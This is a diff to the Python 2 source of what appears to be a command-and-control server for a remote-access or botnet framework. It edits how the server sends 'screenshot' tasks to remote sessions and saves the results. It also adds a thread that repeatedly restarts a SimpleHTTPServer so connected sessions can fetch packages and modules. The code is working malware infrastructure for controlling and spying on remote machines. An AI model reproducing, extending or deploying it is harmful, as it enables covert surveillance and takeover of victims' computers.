@@ -117,12 +117,12 @@ def main():
         util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
         sys.exit(0)
 
-    packages = packages[0]
     options = parser.parse_args()
     __debug = options.debug
 
     globals()['debug'] = __debug
-    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
+    globals()['packages'] = packages[0]
+    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
     globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
 
@@ -588,7 +588,9 @@ class C2():
         else:
             task = {"task": "screenshot", "session": self.current_session.info.get('uid')}
             self.current_session.send_task(task)
-            output = self.current_session.recv_task()['result']
+            output = self.current_session.recv_task()
+            print json.dumps(output)
+            output = output['result']
             if not os.path.isdir('data'):
                 try:
                     os.mkdir('data')
@@ -761,12 +763,28 @@ class C2():
                 util.display("\n\n[-]", color='red', style='bright', end=',')
                 util.display("Failed Connection:", color='white', style='bright', end=',')
                 util.display(address[0], color='white', style='normal')
+
+            # refresh prompt
             prompt = '\n\n{}'.format(self.current_session._prompt if self.current_session else self._prompt)
             util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
             sys.stdout.flush()
+
             abort = globals()['__abort']
             if abort:
                 break
+
+    @util.threaded
+    def serve_resources(self):
+        """ 
+        Handles serving modules and packages in a seperate thread
+
+        """
+        host, port = self.socket.getsockname()
+        while True:
+            time.sleep(3)
+            globals()['package_handler'].terminate()
+            globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
+
 
     def run(self):
         """ 
@@ -778,6 +796,8 @@ class C2():
         self._active.set()
         if 'c2' not in globals()['__threads']:
             globals()['__threads']['c2'] = self.serve_until_stopped()
+        if 'resources' not in globals()['__threads']:
+            globals()['__threads']['resources'] = self.serve_resources()
         while True:
             try:
                 self._active.wait()
